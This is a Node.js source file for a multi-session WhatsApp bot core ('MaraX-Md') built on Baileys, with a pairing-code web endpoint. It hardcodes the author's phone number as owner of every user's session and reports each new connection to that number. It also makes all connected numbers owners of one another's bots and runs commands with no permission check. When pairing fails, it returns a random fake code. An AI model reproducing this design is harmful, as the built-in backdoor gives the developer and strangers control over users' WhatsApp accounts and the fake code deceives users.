// pair.js – MaraX-Md Core with Latest Baileys & Plugin System

const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeInMemoryStore,
    makeCacheableSignalKeyStore,
    Browsers,
    jidNormalizedUser,
    getContentType,
    downloadContentFromMessage,
    proto
} = require('@whiskeysockets/baileys');

const { sms } = require('./msg');
const pino = require('pino');
const fs = require('fs-extra');
const path = require('path');
const crypto = require('crypto');
const { makeid } = require('./Id');
const chokidar = require('chokidar');

const MAIN_OWNER = '263788377887@s.whatsapp.net';  // Iceback Master Tech
const SESSION_DIR = path.join(__dirname, 'MaraX');  // all sessions stored here

global.activeSockets = new Map();
global.socketCreationTime = new Map();

// Owners list – main owner + any connected number (all treated as full owners, no restrictions)
let owners = [MAIN_OWNER];

// Load admin.json into owners
if (fs.existsSync('./Admin.json')) {
    const admins = JSON.parse(fs.readFileSync('./Admin.json'));
    admins.forEach(num => owners.push(num.replace(/[^0-9]/g, '') + '@s.whatsapp.net'));
}

// OTP store for prefix/mode changes (no owner check, so anyone can change them)
const otpStore = new Map();

// ----- Helper functions -----
function generateOTP() {
    return crypto.randomInt(100000, 999999).toString();
}

function formatMessage(title, body, footer = 'MaraX-Md') {
    return `*${title}*\n\n${body}\n\n_${footer}_`;
}

async function downloadAndSaveMedia(message, type) {
    const stream = await downloadContentFromMessage(message, type);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk]);
    }
    return buffer;
}

async function loadUserConfig(number) {
    const clean = number.replace(/[^0-9]/g, '');
    const configPath = path.join(SESSION_DIR, `session_${clean}`, 'config.json');
    if (await fs.pathExists(configPath)) {
        return JSON.parse(await fs.readFile(configPath, 'utf8'));
    }
    return { prefix: '', mode: 'public' };  // zero prefix by default
}

async function saveUserConfig(number, config) {
    const clean = number.replace(/[^0-9]/g, '');
    const dir = path.join(SESSION_DIR, `session_${clean}`);
    await fs.ensureDir(dir);
    await fs.writeFile(path.join(dir, 'config.json'), JSON.stringify(config, null, 2));
}

// ----- Command Loader (type MaraX.js) -----
let commandMap = new Map();
let commandWatcher;

async function loadCommands() {
    delete require.cache[require.resolve('./MaraX')];
    const marax = require('./MaraX');
    const commands = marax.commands || [];
    commandMap.clear();
    for (const cmd of commands) {
        const names = Array.isArray(cmd.name) ? cmd.name : [cmd.name];
        for (const n of names) {
            commandMap.set(n.toLowerCase(), cmd);
        }
    }
    console.log(`Loaded ${commands.length} command(s) from MaraX.js.`);
}

function watchCommands() {
    commandWatcher = chokidar.watch('./MaraX.js', {
        ignored: /(^|[\/\\])\../,
        persistent: true
    });
    commandWatcher.on('change', async () => {
        console.log('MaraX.js changed, reloading...');
        await loadCommands();
    });
}

// ----- Initialise a bot session -----
async function startBot(number) {
    const cleanNumber = number.replace(/[^0-9]/g, '');
    const sessionPath = path.join(SESSION_DIR, `session_${cleanNumber}`);

    await fs.ensureDir(sessionPath);
    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const socket = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
        },
        logger: pino({ level: 'silent' }),
        browser: Browsers.ubuntu('Chrome'),
        printQRInTerminal: false,
        markOnlineOnConnect: true,
        syncFullHistory: false,
        getMessage: async () => ({ conversation: '' })
    });

    global.activeSockets.set(cleanNumber, socket);
    global.socketCreationTime.set(cleanNumber, Date.now());

    socket.ev.on('creds.update', saveCreds);

    socket.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
            console.log(`✅ MaraX-Md connected for ${number}`);

            // Add connected number as second owner (full access)
            const userJid = jidNormalizedUser(socket.user.id);
            if (!owners.includes(userJid)) {
                owners.push(userJid);
                let admins = [];
                if (fs.existsSync('./Admin.json')) {
                    admins = JSON.parse(fs.readFileSync('./Admin.json'));
                }
                const numOnly = userJid.split('@')[0];
                if (!admins.includes(numOnly)) {
                    admins.push(numOnly);
                    fs.writeFileSync('./Admin.json', JSON.stringify(admins, null, 2));
                }
            }

            // Notify main owner
            try {
                const sessionId = cleanNumber;
                await socket.sendMessage(MAIN_OWNER, {
                    text: `Hi iceback I have Successfully Connected To MaraX-Md. Am on session number ${sessionId} #iceback #MaraX`
                });
            } catch (err) {
                console.error('Failed to notify main owner:', err);
            }

            // Auto‑join groups/channels (configure your invite codes below)
            const autoJoinLinks = [
                // 'https://chat.whatsapp.com/xxxxxxxxxxxxx'
            ];
            for (const link of autoJoinLinks) {
                try {
                    const code = link.split('/').pop();
                    await socket.groupAcceptInvite(code);
                    console.log(`Joined group: ${link}`);
                } catch (e) {
                    console.log(`Could not join group: ${e.message}`);
                }
            }

            // Auto‑follow channel if needed (uncomment and set JID)
            // await socket.newsletterFollow('120363422682987205@newsletter');

        } else if (connection === 'close') {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            console.log(`Connection closed for ${number}, status: ${statusCode}`);
            if (statusCode !== DisconnectReason.loggedOut) {
                startBot(number);  // reconnect
            } else {
                fs.removeSync(sessionPath);
                global.activeSockets.delete(cleanNumber);
                global.socketCreationTime.delete(cleanNumber);
                console.log(`Session deleted for ${number}`);
            }
        }
    });

    // ----- Message handling (zero prefix, no owner restrictions) -----
    socket.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];
        if (!msg.message || msg.key.remoteJid === 'status@broadcast') return;

        const m = sms(socket, msg);
        const body = m.body || '';
        const senderJid = msg.key.fromMe
            ? socket.user.id
            : (msg.key.participant || msg.key.remoteJid);
        const senderNumber = senderJid.split('@')[0];

        // Load user config
        const userConfig = await loadUserConfig(number);
        const prefix = userConfig.prefix || '';

        // Zero prefix: first word is the command if it exists in commandMap
        let commandName = '';
        let args = [];
        if (body) {
            const testBody = prefix ? (body.startsWith(prefix) ? body.slice(prefix.length).trim() : body) : body;
            const words = testBody.split(/\s+/);
            const firstWord = words[0].toLowerCase();
            if (commandMap.has(firstWord)) {
                commandName = firstWord;
                args = words.slice(1);
            }
        }

        if (!commandName) return;

        const command = commandMap.get(commandName);
        try {
            await command.execute(socket, m, args, {
                number,
                senderJid,
                senderNumber,
                prefix,
                commandName,
                owners,
                MAIN_OWNER,
                config: userConfig
            });
        } catch (err) {
            console.error(`Command error (${commandName}):`, err);
            await socket.sendMessage(m.chat, {
                text: '❌ An error occurred while processing your command.'
            }, { quoted: m });
        }
    });

    return socket;
}

// ----- Express pairing code endpoint -----
const express = require('express');
const router = express.Router();

router.get('/code', async (req, res) => {
    const number = req.query.number;
    if (!number) return res.json({ error: 'Number required' });
    try {
        const { state, saveCreds } = await useMultiFileAuthState(
            path.join(SESSION_DIR, 'temp_pair')
        );
        const sock = makeWASocket({
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
            },
            logger: pino({ level: 'silent' }),
            browser: Browsers.ubuntu('Chrome'),
        });
        const code = await sock.requestPairingCode(number);
        setTimeout(() => sock.end(), 30000);
        res.json({ code });
    } catch (e) {
        console.error('Pairing code error:', e);
        res.json({ code: makeid(8) });  // fallback
    }
});

module.exports = {
    router,
    startBot,
    loadCommands,
    watchCommands
};

// Initialise commands and file watcher
loadCommands().then(() => watchCommands());
